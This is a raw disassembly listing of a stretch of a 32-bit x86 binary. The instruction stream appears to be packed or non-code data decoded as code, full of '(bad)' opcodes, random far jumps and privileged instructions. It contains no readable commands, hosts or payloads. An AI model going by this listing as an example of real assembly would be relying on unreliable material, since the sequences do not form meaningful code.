  415c62:	mov    esi,0x90f39219
  415c67:	dec    edi
  415c68:	or     dl,BYTE PTR [ebx-0x4fb5bee5]
  415c6e:	jge    0x415c55
  415c70:	jns    0x415c2d
  415c72:	(bad)  
  415c73:	xlat   BYTE PTR ds:[ebx]
  415c74:	aad    0x62
  415c76:	fxam   
  415c78:	push   es
  415c79:	jno    0x415ce1
  415c7b:	xchg   edx,eax
  415c7c:	iret   
  415c7d:	or     al,0x1a
  415c7f:	mov    cl,0x87
  415c81:	test   BYTE PTR [esi+0x7e],ah
  415c84:	pop    edx
  415c85:	jle    0x415c22
  415c87:	pop    edx
  415c88:	xor    al,0x8b
  415c8a:	mov    edi,DWORD PTR [esi+0xf42d71]
  415c90:	jp     0x415cd7
  415c92:	xchg   edx,eax
  415c93:	xor    bl,BYTE PTR [edi]
  415c95:	push   ebp
  415c96:	aad    0xc3
  415c98:	nop
  415c99:	inc    edi
  415c9a:	xor    bh,0x87
  415c9d:	aam    0x48
  415c9f:	clc    
  415ca0:	inc    edx
  415ca1:	jmp    0x1baa:0xd62ef70
  415ca8:	mov    ?,WORD PTR [esp+esi*1-0xaef8c9c]
  415caf:	sub    ebx,DWORD PTR [ebx+0xed7a471]
  415cb5:	mov    dh,0x15
  415cb7:	shl    bh,cl
  415cb9:	or     DWORD PTR [esi+0x6e5dbc7b],ebp
  415cbf:	inc    ebx
  415cc0:	xchg   edi,eax
  415cc1:	js     0x415cc3
	...
  415d33:	add    BYTE PTR [edi+0x3e911299],dh
  415d39:	fwait
  415d3a:	mov    bh,0xbf
  415d3c:	pop    ebp
  415d3d:	jmp    0x36b:0xc240e72f
  415d44:	sub    bh,ch
  415d46:	add    BYTE PTR [eax],al
  415d48:	test   BYTE PTR [eax],0x0
  415d4b:	add    BYTE PTR [ebx+0x32815f98],ch
  415d51:	push   ebp
  415d52:	add    al,0x4
  415d54:	jmp    0x8dd76422
  415d59:	ja     0x415da2
  415d5b:	mov    al,ds:0x84015de1
  415d60:	imul   ecx,edx,0xddebfbee
  415d66:	stos   BYTE PTR es:[edi],al
  415d67:	mov    al,ds:0xac8cd198
  415d6c:	inc    esp
  415d6d:	pop    ss
  415d6e:	popa   
  415d6f:	shr    DWORD PTR ds:0x2e0e5234,1
  415d75:	xor    al,0xdd
  415d77:	iret   
  415d78:	and    DWORD PTR ds:0xc8f0aefe,edx
  415d7e:	cdq    
  415d7f:	shl    DWORD PTR [ecx],0x64
  415d82:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d85:	cld    
  415d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d87:	mov    cl,0xf6
  415d89:	sub    DWORD PTR [ecx+0x6a8ce882],eax
  415d8f:	pop    ds
  415d90:	mov    ds:0x7e323855,al
  415d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d96:	bound  ebp,QWORD PTR [eax]
  415d98:	iret   
  415d99:	xor    DWORD PTR [ecx],ebx
  415d9b:	mov    ?,WORD PTR [ebx+0x33]
  415d9e:	stos   BYTE PTR es:[edi],al
  415d9f:	fwait
  415da0:	add    DWORD PTR [ebp-0x7a],esi
  415da3:	hlt    
  415da4:	xor    dh,bl
  415da6:	loope  0x415d91
  415da8:	push   0xd4f41ecb
  415dad:	(bad)  
  415dae:	pop    es
  415daf:	repnz test DWORD PTR [edx],edi
  415db2:	lds    esp,FWORD PTR [ecx+eiz*2+0x632f38]
  415db9:	mov    ds:0xb3893f54,eax
  415dbe:	sahf   
  415dbf:	add    ecx,edi
  415dc1:	and    ebp,esi
  415dc3:	inc    edi
  415dc4:	std    
  415dc5:	mov    edi,0x88a2d75c
  415dca:	xor    edi,DWORD PTR [esi-0x32]
  415dcd:	and    al,0x6c
  415dcf:	inc    eax
  415dd0:	ins    BYTE PTR es:[edi],dx
  415dd1:	mov    BYTE PTR [edi-0x1191ab7d],ah
  415dd7:	(bad)  
  415dd8:	out    dx,al
  415dd9:	xchg   esi,eax
  415dda:	or     dh,dh
  415ddc:	sub    BYTE PTR [esi-0x14759166],ch
  415de2:	fst    DWORD PTR [esi+0x6c]
  415de5:	mov    BYTE PTR [edi+0x11],dh
  415de8:	aam    0xba
  415dea:	and    BYTE PTR [ebx],dl
  415dec:	rcr    esp,1
  415dee:	xor    DWORD PTR [edx+0x1f],esi
  415df1:	int    0x22
  415df3:	ret    
  415df4:	ds jg  0x415de9
  415df7:	xchg   ebx,eax
  415df8:	test   eax,0x60ccc2a9
  415dfd:	xchg   ebx,eax
  415dfe:	add    al,0x19
  415e00:	or     edi,DWORD PTR [ebp+0xa2bc679]
  415e06:	jge    0x415e20
  415e08:	loope  0x415de2
  415e0a:	or     DWORD PTR [ebx],ebp
  415e0c:	push   0x59f66b5f
  415e11:	ins    BYTE PTR es:[edi],dx
  415e12:	or     DWORD PTR [esi],ebx
  415e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e15:	mov    bh,0xbd
  415e17:	outs   dx,BYTE PTR ds:[esi]
  415e18:	pop    edi
  415e19:	xor    ebp,ebp
  415e1b:	dec    ebp
  415e1c:	imul   eax,DWORD PTR [ebx+0xd],0xb
  415e20:	ins    DWORD PTR es:[edi],dx
  415e21:	ret    
  415e22:	pop    di
  415e24:	call   0x48d9ddb4
  415e29:	mul    DWORD PTR [edi-0x7c]
  415e2c:	jnp    0x415dce
  415e2e:	sub    ebx,edx
  415e30:	push   cs
  415e31:	xor    BYTE PTR [edi-0x49e11d36],ah
  415e37:	imul   esi,DWORD PTR [ecx+0x51],0xbfb156d0
  415e3e:	mov    ebx,0x4aa94c
	...
  415eb3:	add    BYTE PTR [edi],dh
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs scas eax,DWORD PTR es:[edi]
  415ec1:	push   ebx
  415ec2:	call   esi
  415ec4:	push   ds
  415ec5:	lock add BYTE PTR [eax],al
  415ec8:	test   BYTE PTR [eax],0x0
  415ecb:	add    BYTE PTR [ebp+0x17],ch
  415ece:	jl     0x415ee7
  415ed0:	sbb    bl,bl
  415ed2:	out    dx,al
  415ed3:	cmp    BYTE PTR [edi+0x2f3d9121],dh
  415ed9:	leave  
  415eda:	int    0xfa
  415edc:	neg    DWORD PTR ds:0x4cf6b46f
  415ee2:	mov    al,ds:0x3115744f
  415ee7:	sbb    eax,0x8bc35507
  415eec:	repz mov eax,ds:0xc1362ed7
  415ef2:	mov    ds,WORD PTR [ebx+eax*1+0x5ef8623f]
  415ef9:	pop    es
  415efa:	pop    edi
  415efb:	or     al,0x86
  415efd:	cmp    al,0x24
  415eff:	mov    bl,BYTE PTR [ebx+ebx*2+0x76]
  415f03:	ja     0x415f0e
  415f05:	bound  ebx,QWORD PTR [ebx-0x2f66793c]
  415f0b:	sub    esp,edi
  415f0d:	cmp    al,0x7
  415f0f:	call   0x60aa3686
  415f14:	daa    
  415f15:	xchg   edi,eax
  415f16:	dec    ecx
  415f17:	mov    al,ds:0x157e7c8f
  415f1c:	nop
  415f1d:	call   FWORD PTR [ecx]
  415f1f:	ja     0x415ec5
  415f21:	iret   
  415f22:	ds inc edx
  415f24:	call   DWORD PTR [edi]
  415f26:	xor    eax,0x17a0e45a
  415f2b:	sub    dh,BYTE PTR [eax-0x2e6442b6]
  415f31:	push   esi
  415f32:	dec    ebp
  415f33:	lods   eax,DWORD PTR ds:[esi]
  415f34:	jecxz  0x415f3b
  415f36:	popa   
  415f37:	gs jnp 0x415f60
  415f3a:	mov    al,0x9c
  415f3c:	leave  
  415f3d:	clc    
  415f3e:	ret    0xc1bc
  415f41:	sub    esp,DWORD PTR [esi]
  415f43:	inc    ebx
  415f44:	(bad)  
  415f45:	fsubr  DWORD PTR [ebp+ecx*2+0x65]
  415f49:	stc    
  415f4a:	pushf  
  415f4b:	dec    edi
  415f4c:	pminsw mm2,mm0
  415f4f:	mov    esi,DWORD PTR [edi+0x635f7416]
  415f55:	rcl    BYTE PTR [edi],1
  415f57:	push   0x5c
  415f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f5a:	arpl   sp,dx
  415f5c:	jo     0x415fdc
  415f5e:	daa    
  415f5f:	push   0xb163de9e
  415f64:	(bad)
  415f68:	inc    esi
  415f69:	mov    al,ds:0x511502d2
  415f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f6f:	inc    ebx
  415f70:	mov    bh,0xb
  415f72:	call   0xc92:0xc4537235
  415f79:	sub    edx,ebx
  415f7b:	into   
  415f7c:	sahf   
  415f7d:	test   BYTE PTR [edx],al
  415f7f:	sub    eax,ecx
  415f81:	pop    eax
  415f82:	xor    cl,0xfe
  415f85:	repz into 
  415f87:	int3   
  415f88:	mov    ds:0x43b2dad5,al
  415f8d:	adc    al,0xa0
  415f8f:	ror    BYTE PTR [edi],1
  415f91:	fsub   DWORD PTR [ecx+0x3d]
  415f94:	fadd   DWORD PTR [ebx]
  415f96:	jg     0x415fc3
  415f98:	adc    BYTE PTR [eax-0x4ec6e69d],dl
  415f9e:	sbb    BYTE PTR [ebx-0x39],0x39
  415fa2:	cdq    
  415fa3:	cld    
  415fa4:	mov    edi,0xdd1dfbb5
  415fa9:	dec    esi
  415faa:	jmp    0xda5:0xf49f93cd
  415fb1:	cli    
  415fb2:	add    eax,0xb2b513bf
  415fb7:	mov    bh,0xec
  415fb9:	jmp    0x415ffd
  415fbb:	rcl    DWORD PTR [ebp-0x2985e80c],1
  415fc1:	xor    eax,DWORD PTR [eax]
	...
  416033:	add    BYTE PTR [ebx+0x2],bh
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   ebp,esi,0xffffffd6
  416042:	dec    eax
  416043:	gs adc al,0xf1
  416046:	add    BYTE PTR [eax],al
  416048:	test   BYTE PTR [eax],0x0
  41604b:	add    BYTE PTR [edi+0x19],dh
  41604e:	mov    dh,0xa8
  416050:	out    0xbc,al
  416052:	adc    BYTE PTR [ebx],0xa4
  416055:	xchg   eax,edi
  416057:	popf   
  416058:	adc    al,0xad
  41605a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605c:	mov    dh,0xe8
  41605e:	out    0x78,al
  416060:	mov    edi,0x6005ba3f
  416065:	stc    
  416066:	dec    ecx
  416067:	pusha  
  416068:	jae    0x415ff5
  41606a:	push   ebp
  41606b:	xlat   BYTE PTR ds:[ebx]
  41606c:	adc    ebx,DWORD PTR [edi]
  41606e:	lock add BYTE PTR [ebp-0x41baf9d5],dl
  416075:	push   ss
  416076:	xor    DWORD PTR [ebx],esp
  416078:	and    esp,ebp
  41607a:	or     ch,BYTE PTR [esi-0x5378bf74]
  416080:	mov    ecx,0x772e7d61
  416085:	call   0x2b392a14
  41608a:	mov    esi,0x455c30b5
  41608f:	mov    edx,ebx
  416091:	dec    eax
  416092:	jmp    0x4040a954
  416097:	inc    ebp
  416098:	cdq    
  416099:	mov    ds,WORD PTR [edx]
  41609b:	test   eax,0x192da15e
  4160a0:	xchg   esi,eax
  4160a1:	fnsave [edx-0x4b06d7fc]
  4160a7:	test   al,0xb7
  4160a9:	ins    BYTE PTR es:[edi],dx
  4160aa:	sub    eax,0x8c230b81
  4160af:	and    ah,BYTE PTR [esi-0x87d4c88]
  4160b5:	ins    BYTE PTR es:[edi],dx
  4160b6:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4160b8:	fdivr  DWORD PTR [ebx-0x780ed976]
  4160be:	or     BYTE PTR [ebp+edi*4-0x2ede15e1],al
  4160c5:	das    
  4160c6:	mov    ebx,0x7bcae9de
  4160cb:	stos   DWORD PTR es:[edi],eax
  4160cc:	mov    ds:0x72960097,al
  4160d1:	out    0xbd,eax
  4160d3:	out    dx,eax
  4160d4:	aad    0x40
  4160d6:	out    dx,eax
  4160d7:	ror    BYTE PTR [ebx+eax*4],0x11
  4160db:	loop   0x41612f
  4160dd:	xor    al,0x2b
  4160df:	dec    edx
  4160e0:	xor    ebp,DWORD PTR [esi+eax*2-0x5d]
  4160e4:	push   cs
  4160e5:	popa   
  4160e6:	cli    
  4160e7:	inc    edi
  4160e8:	retf   0x5954
  4160eb:	xchg   ecx,eax
  4160ec:	in     eax,dx
  4160ed:	xor    al,0x2e
  4160ef:	mov    edx,0x7e6c7bae
  4160f4:	int    0x7f
  4160f6:	imul   esi,DWORD PTR [eax],0xffffff94
  4160f9:	jp     0x416108
  4160fb:	cmp    esi,DWORD PTR [edi+eiz*2+0x2f]
  4160ff:	mov    eax,0x1d61fb80
  416104:	push   ebx
  416105:	jmp    FWORD PTR [esi+0x22]
  416108:	fwait
  416109:	dec    edx
  41610a:	xor    esp,DWORD PTR [esi+0x37]
  41610d:	add    ebp,ecx
  41610f:	pop    ss
  416110:	cmp    DWORD PTR [edx],edi
  416112:	pop    edx
  416113:	sbb    DWORD PTR ds:0x1cfd00a8,edi
  416119:	inc    ebx
  41611a:	xchg   edx,eax
  41611b:	inc    edx
  41611c:	scas   eax,DWORD PTR es:[edi]
  41611d:	xchg   esp,edx
  41611f:	test   DWORD PTR es:[ecx],ebx
  416122:	shr    BYTE PTR [edx],cl
  416124:	mov    BYTE PTR [eax+0x39d470fc],cl
  41612a:	mov    al,0x2f
  41612c:	icebp  
  41612d:	imul   edx,DWORD PTR [ebx-0x4d],0x7a
  416131:	aam    0xf
  416133:	xor    bh,BYTE PTR [bx-0x4629]
  416138:	out    dx,eax
  416139:	test   al,0xa6
  41613b:	cmp    BYTE PTR [eax-0x5],cl
  41613e:	sub    eax,DWORD PTR [ebx+0xa7c4]
	...
  4161b4:	sub    al,0x97
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    ebx,DWORD PTR [edx]
  4161c1:	inc    eax
  4161c2:	out    0x99,eax
  4161c4:	or     dh,dl
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	test   BYTE PTR [eax],0x0
  4161cb:	add    BYTE PTR [ebp-0x6dfc1b7],al
  4161d1:	mov    ds:0xcda01111,eax
  4161d6:	add    al,0xaf
  4161d8:	adc    dl,BYTE PTR [ebx+0xb9fd5f3]
  4161de:	lds    esp,FWORD PTR [edi-0x58]
  4161e1:	pop    edx
  4161e2:	push   0x5b
  4161e4:	push   0x3b
  4161e6:	data16 mov al,0xbb
  4161e9:	in     al,dx
  4161ea:	and    cl,BYTE PTR [eax-0x13ed9234]
  4161f0:	daa    
  4161f1:	ss cmp ebp,esi
  4161f4:	xor    al,cl
  4161f6:	shl    DWORD PTR ds:0x708ab98f,1
  4161fc:	bound  edx,QWORD PTR [ebx+0x67]
  4161ff:	mov    ebx,DWORD PTR [ebx-0x14]
  416202:	test   DWORD PTR [ebp-0x2cfafd9f],eax
  416208:	hlt    
  416209:	adc    eax,0xf51a03ce
  41620e:	mov    esi,0x62f6b757
  416213:	and    al,BYTE PTR [edx+0x1e2239ac]
  416219:	mov    ebp,0x7e196622
  41621e:	push   esp
  41621f:	cmp    dl,ah
  416221:	add    esi,ebx
  416223:	pop    ebp
  416224:	div    esp
  416226:	xchg   BYTE PTR [ebx-0x544ff015],ch
  41622c:	jmp    0x416276
  41622e:	add    eax,0xf31e406d
  416233:	sbb    BYTE PTR [eax+0x59],cl
  416236:	adc    edi,esp
  416238:	ja     0x4161bc
  41623a:	mov    dh,0x10
  41623c:	cmc    
  41623d:	sbb    edx,DWORD PTR [eax+0x2f]
  416240:	in     eax,0x3f
  416242:	imul   ebx,ecx,0xdebd55db
  416248:	leave  
  416249:	or     BYTE PTR [ebp+0x2a706215],0xb7
  416250:	adc    ebx,0xffffffad
  416253:	cmp    al,0xcd
  416255:	jmp    0x41625e
  416257:	call   0xba8a:0xd37d7243
  41625e:	int    0x73
  416260:	mov    dl,0xed
  416262:	pop    ss
  416263:	out    0x0,eax
  416265:	or     dl,BYTE PTR [ecx]
  416267:	push   edi
  416268:	rcl    eax,1
  41626a:	push   edx
  41626b:	dec    eax
  41626c:	push   esi
  41626d:	mov    esi,0xe3ba3605
  416272:	xchg   edi,eax
  416273:	jnp    0x4162df
  416275:	add    DWORD PTR [esi+0x14ac134e],ebx
  41627b:	mov    dh,0xa3
  41627d:	std    
  41627e:	ins    BYTE PTR es:[edi],dx
  41627f:	in     eax,dx
  416280:	das    
  416281:	aas    
  416282:	jge    0x4162dd
  416284:	imul   DWORD PTR [ecx]
  416286:	or     BYTE PTR [esi-0x7a],bl
  416289:	adc    DWORD PTR [edx],edx
  41628b:	sar    DWORD PTR [esi],0x7d
  41628e:	je     0x4162a9
  416290:	stc    
  416291:	push   edx
  416292:	cmc    
  416293:	test   BYTE PTR [ecx+0x2d],dh
  416296:	leave  
  416297:	xchg   esp,eax
  416298:	jle    0x4162fa
  41629a:	mov    esp,0xdde3ae89
  41629f:	jmp    0x50175292
  4162a4:	xchg   edx,edi
  4162a6:	adc    eax,DWORD PTR [edi+0x6830a74c]
  4162ac:	lock or DWORD PTR [eax-0x321f6752],0xcb52b954
  4162b7:	cmp    al,0xec
  4162b9:	inc    ecx
  4162ba:	mov    esp,0xeca3ed7
  4162bf:	sbb    ah,BYTE PTR [edx]
  4162c1:	sbb    al,0x0
	...
  416333:	add    BYTE PTR [ebp-0x10],ch
  416336:	repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fstp   st(7)
  416341:	fstp   DWORD PTR [esi-0x42]
  416344:	add    bl,dh
  416346:	add    BYTE PTR [eax],al
  416348:	test   BYTE PTR [eax],0x0
  41634b:	add    BYTE PTR [edx+0x7f],dl
  41634e:	ss inc edx
  416350:	hlt    
  416351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416352:	cmp    DWORD PTR [esi+0x43],0x589eeafa
  416359:	xchg   esp,eax
  41635a:	clc    
  41635b:	mov    bh,0x30
  41635d:	aad    0xca
  41635f:	cmc    
  416360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416361:	pop    esp
  416362:	ss mov ebx,0x979fb177
  416368:	(bad)  
  416369:	(bad)  
  41636a:	jmp    0x91e73a67
  41636f:	xchg   ebx,eax
  416370:	or     eax,0x16085a06
  416375:	dec    edx
  416376:	pop    ecx
  416377:	shl    BYTE PTR [eax-0x637ad448],cl
  41637d:	inc    edi
  41637e:	push   esi
  41637f:	popa   
  416380:	mul    DWORD PTR [ebx]
  416382:	(bad)  
  416383:	ss jb  0x4163f5
  416386:	xchg   ebx,eax
  416387:	lods   al,BYTE PTR ds:[esi]
  416388:	mov    ebp,0xe2ad6e16
  41638d:	mov    ds:0xd2ceef8e,al
  416392:	out    0xae,eax
  416394:	ins    BYTE PTR es:[edi],dx
  416395:	adc    ah,ah
  416397:	jae    0x416321
  416399:	lock jmp 0x8add:0xdb6e1af
  4163a1:	(bad)  
  4163a2:	popf   
  4163a3:	outs   dx,DWORD PTR ds:[esi]
  4163a5:	jmp    0x67b5:0x562f82f3
  4163ac:	pusha  
  4163ad:	inc    edi
  4163ae:	cmc    
  4163af:	inc    ebx
  4163b0:	push   es
  4163b1:	imul   BYTE PTR [esp+esi*8+0x1e]
  4163b5:	aas    
  4163b6:	sub    eax,0xd8e23b9c
  4163bb:	and    eax,0x8032cb0f
  4163c0:	addr16 dec esp
  4163c2:	push   ebx
  4163c3:	lea    ecx,[esi-0x7ec55c77]
  4163c9:	cwde   
  4163ca:	pop    es
  4163cb:	pop    ecx
  4163cc:	pop    ebp
  4163cd:	mov    al,ds:0x8454561f
  4163d2:	mov    BYTE PTR ds:[ebp+0x522a9515],0x90
  4163da:	or     eax,0xec500488
  4163df:	add    DWORD PTR [ecx],esp
  4163e1:	ja     0x416459
  4163e3:	daa    
  4163e4:	call   0x48d5:0xc110facd
  4163eb:	enter  0x8527,0xcf
  4163ef:	or     eax,0x8d68abc5
  4163f4:	sbb    edi,esp
  4163f6:	hlt    
  4163f7:	(bad)  
  4163f8:	std    
  4163f9:	xchg   edx,edx
  4163fb:	fadd   DWORD PTR [ecx+ebx*4+0x5ea5405e]
  416402:	mov    eax,0x9b318907
  416407:	push   0x20abe91b
  41640c:	jb     0x4163ba
  41640e:	bound  ebx,QWORD PTR [ebx+0x33fec427]
  416414:	adc    BYTE PTR [ebx-0x385668e2],ah
  41641a:	idiv   BYTE PTR [ebp-0x6f]
  41641d:	(bad)  
  41641e:	out    dx,eax
  41641f:	icebp  
  416420:	daa    
  416421:	jl     0x416403
  416423:	add    DWORD PTR [esp+ebp*2],ecx
  416426:	inc    edx
  416427:	mov    bl,0x18
  416429:	call   DWORD PTR [edx-0x61ad63b1]
  41642f:	ret    
  416430:	call   FWORD PTR [edx-0x2a35834e]
  416436:	jg     0x4164b2
  416438:	cmove  ebx,DWORD PTR [eax+0x22]
  41643c:	xor    esi,DWORD PTR [esi]
  41643e:	shl    BYTE PTR [ebx+0x73bb],0x0
	...
  4164b1:	add    BYTE PTR [eax],al
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	push   es
  4164c1:	xor    DWORD PTR [edi+0x6b],ecx
  4164c4:	div    bl
  4164c6:	add    BYTE PTR [eax],al
  4164c8:	test   BYTE PTR [eax],0x0
  4164cb:	add    BYTE PTR [edx+eax*2],bl
  4164ce:	(bad)  
  4164cf:	mov    bl,0x76
  4164d1:	add    eax,0x6d2ac6cb
  4164d6:	hlt    
  4164d7:	cli    
  4164d8:	and    al,0xd6
  4164da:	and    eax,0x8c2a5870
  4164df:	ins    DWORD PTR es:[edi],dx
  4164e0:	jnp    0x4164da
  4164e2:	xchg   esp,ecx
  4164e4:	adc    al,0xdc
  4164e6:	xchg   ebp,eax
  4164e7:	arpl   WORD PTR [ebx],ax
  4164e9:	stos   DWORD PTR es:[edi],eax
  4164ea:	inc    edi
  4164eb:	push   eax
  4164ec:	mov    ebp,DWORD PTR [ebp-0x6b3dad13]
  4164f2:	les    ebx,FWORD PTR [eax-0x75]
  4164f5:	aad    0xf2
  4164f7:	dec    ebp
  4164f8:	fisubr WORD PTR [edi]
  4164fa:	push   eax
  4164fb:	shl    DWORD PTR [ecx-0x58e72d5f],cl
  416501:	out    dx,al
  416502:	mov    dl,0x72
  416504:	push   ss
  416505:	pop    edi
  416506:	clc    
  416507:	mov    ebp,0xae720552
  41650c:	dec    eax
  41650d:	stc    
  41650e:	daa    
  41650f:	cwd    
  416511:	clc    
  416512:	add    eax,0xc8de8666
  416517:	adc    eax,0xd25ea08e
  41651c:	push   eax
  41651d:	pop    eax
  41651e:	pop    esi
  41651f:	jge    0x41652d
  416521:	cmp    ecx,DWORD PTR [esi]
  416523:	mov    esi,0xeb83a22a
  416528:	repnz ficomp DWORD PTR [esi+0x34fa98a7]
  41652f:	mov    al,0xef
  416531:	ret    0x5826
  416534:	sbb    DWORD PTR [eax+0x57],eax
  416537:	push   esi
  416538:	shr    DWORD PTR [ecx+0x61705a73],0xb7
  41653f:	stos   BYTE PTR es:[edi],al
  416540:	jecxz  0x416563
  416542:	imul   edi,esp,0xffffffec
  416545:	jecxz  0x4165a6
  416547:	or     dh,cl
  416549:	inc    ecx
  41654a:	add    BYTE PTR [edi],dl
  41654c:	out    0x89,al
  41654e:	pop    edx
  41654f:	or     BYTE PTR ds:0x54f6eb25,al
  416555:	jp     0x41650d
  416557:	mov    al,0x36
  416559:	sbb    eax,0xc38c7aa2
  41655e:	add    al,0x2f
  416560:	iret   
  416561:	sub    BYTE PTR [edx],0x95
  416564:	adc    al,0xbc
  416566:	cmp    eax,0x85483587
  41656b:	ins    BYTE PTR es:[edi],dx
  41656c:	in     al,dx
  41656d:	sub    bh,BYTE PTR [eax-0x5384a32b]
  416573:	adc    ecx,DWORD PTR [edx+0x4a]
  416576:	mov    ah,0x39
  416578:	neg    ebp
  41657a:	jge    0x416537
  41657c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657d:	test   cl,dl
  41657f:	xlat   BYTE PTR ds:[ebx]
  416580:	aam    0x5d
  416582:	jg     0x416527
  416584:	imul   esp,DWORD PTR [esi-0x75],0x815270b
  41658b:	je     0x416544
  41658d:	sub    BYTE PTR [edx-0x739f004],0x16
  416594:	dec    esp
  416595:	xchg   ebx,eax
  416596:	dec    esp
  416597:	push   edx
  416598:	(bad)  
  416599:	(bad)
  41659e:	call   0xf70:0x4ade26ff
  4165a5:	or     DWORD PTR [eax-0x6d],esi
  4165a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165a9:	stc    
  4165aa:	data16 or BYTE PTR [ecx-0x7711dcf5],al
  4165b1:	mov    DWORD PTR [esi+ebx*4+0x55],ecx
  4165b5:	mov    esp,0x3fe29c87
  4165ba:	push   ebp
  4165bb:	pop    eax
  4165bc:	mov    ebp,0x70f34eb9
  4165c1:	and    al,BYTE PTR [eax]
	...
  416633:	add    BYTE PTR [ebp-0x66],ch
  416636:	mov    esp,0xfd67ff45
  41663b:	mov    edx,0xd5f418cb
  416640:	jne    0x416686
  416642:	icebp  
  416643:	int3   
  416644:	in     al,dx
  416645:	hlt    
  416646:	add    BYTE PTR [eax],al
  416648:	test   BYTE PTR [eax],0x0
  41664b:	add    BYTE PTR [ecx],ah
  41664d:	push   esi
  41664e:	ret    
  41664f:	mov    esi,0xfb241148
  416654:	ret    0x2dcc
  416657:	or     eax,0xa1ec7a26
  41665c:	mov    dh,BYTE PTR [edi+0x2c3909fd]
  416662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416663:	cmp    BYTE PTR [edi],ch
  416665:	test   DWORD PTR [esi-0x13],ebx
  416668:	jo     0x4166bc
  41666a:	test   eax,0xe3d29b65
  41666f:	pop    ds
  416670:	inc    ebp
  416671:	push   ebp
  416672:	xchg   BYTE PTR [ecx-0x3a],al
  416675:	loopne 0x416616
  416677:	sub    eax,0x9260c47a
  41667c:	int3   
  41667d:	sbb    bl,BYTE PTR [edi]
  41667f:	das    
  416680:	sti    
  416681:	adc    cl,BYTE PTR ds:0xec0e5a17
  416687:	mov    ds,WORD PTR [eax+0x7d]
  41668a:	and    al,0x19
  41668c:	cmp    ah,0x9
  41668f:	stc    
  416690:	sahf   
  416691:	cmp    BYTE PTR [edi+0x780a6e73],bh
  416697:	adc    ch,BYTE PTR [ecx-0x749901fb]
  41669d:	cmp    al,0x7d
  41669f:	test   al,0x85
  4166a1:	mov    DWORD PTR [edi-0x6902f053],ecx
  4166a7:	in     al,dx
  4166a8:	inc    ebp
  4166a9:	sar    BYTE PTR [ebx+0x3b],0x20
  4166ad:	adc    edi,ecx
  4166af:	(bad)  
  4166b0:	js     0x416704
  4166b2:	lds    ecx,FWORD PTR [eax+esi*4+0x3d]
  4166b6:	mov    ?,WORD PTR [edx]
  4166b8:	pop    DWORD PTR [edi-0x12]
  4166bb:	es sbb esi,eax
  4166be:	inc    edi
  4166bf:	in     al,0x60
  4166c1:	jmp    0x9a5a:0xeb55b64c
  4166c8:	push   edi
  4166c9:	mov    ds:0x84b6d4e9,al
  4166ce:	mov    ch,0x7c
  4166d0:	in     eax,0xcc
  4166d2:	xchg   BYTE PTR [eax+0x31],ch
  4166d5:	das    
  4166d6:	push   cs
  4166d7:	sub    esi,DWORD PTR [eax+0x1c]
  4166da:	sbb    ch,dl
  4166dc:	sub    dh,BYTE PTR [edi-0x3b]
  4166df:	out    0x82,eax
  4166e1:	mov    bh,0x99
  4166e3:	bound  eax,QWORD PTR [ebx+0x22]
  4166e6:	arpl   WORD PTR [edx],bx
  4166e8:	adc    cl,BYTE PTR [eax]
  4166ea:	into   
  4166eb:	sub    bh,BYTE PTR [edi-0x8c5b6fd]
  4166f1:	out    0x52,eax
  4166f3:	aad    0xad
  4166f5:	data16 mov cl,0x6e
  4166f8:	xlat   BYTE PTR ds:[ebx]
  4166f9:	push   ds
  4166fa:	pop    ebx
  4166fb:	clc    
  4166fc:	mov    eax,0x3769846f
  416701:	sbb    al,0x5c
  416703:	into   
  416704:	mov    ds:0x4d458fac,al
  416709:	jae    0x416750
  41670b:	mov    eax,esp
  41670d:	adc    edi,ebx
  41670f:	mov    al,BYTE PTR [edx+0x3b]
  416712:	sti    
  416713:	cmp    esi,DWORD PTR [esi-0x5d]
  416716:	aad    0x52
  416718:	scas   al,BYTE PTR es:[edi]
  416719:	sub    edi,esp
  41671b:	push   esp
  41671c:	sbb    DWORD PTR [ebx-0x77],edi
  41671f:	adc    al,0xda
  416721:	mov    edx,0x597e91d8
  416726:	push   ss
  416727:	jnp    0x416702
  416729:	cs pusha 
  41672b:	test   DWORD PTR [ecx+0x102c3988],edi
  416731:	sbb    esi,ebp
  416733:	xchg   BYTE PTR [eax],al
  416735:	push   esp
  416736:	cmp    ah,BYTE PTR [esi+0x45]
  416739:	push   ecx
  41673a:	repz repz ret 
  41673d:	xor    al,0xbc
  41673f:	or     eax,0xa272
	...
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm5,DWORD PTR [esi]
  4167c1:	jl     0x4167fa
  4167c3:	sbb    edx,esp
  4167c5:	cmc    
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	test   BYTE PTR [eax],0x0
  4167cb:	add    cl,al
  4167cd:	stc    
  4167ce:	or     eax,0xc6b82caf
  4167d3:	push   cs
